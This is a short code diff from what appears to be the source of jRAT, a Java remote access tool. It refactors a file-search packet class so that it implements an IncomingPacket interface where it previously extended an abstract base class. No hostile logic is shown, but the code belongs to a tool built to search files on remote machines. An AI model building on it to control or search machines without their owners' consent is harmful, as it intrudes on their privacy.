@@ -1,13 +1,13 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 import jrat.module.fs.FileSearch;
 
 import java.io.File;
 
 
-public class Packet53StartSearch extends AbstractIncomingPacket {
+public class Packet53StartSearch implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
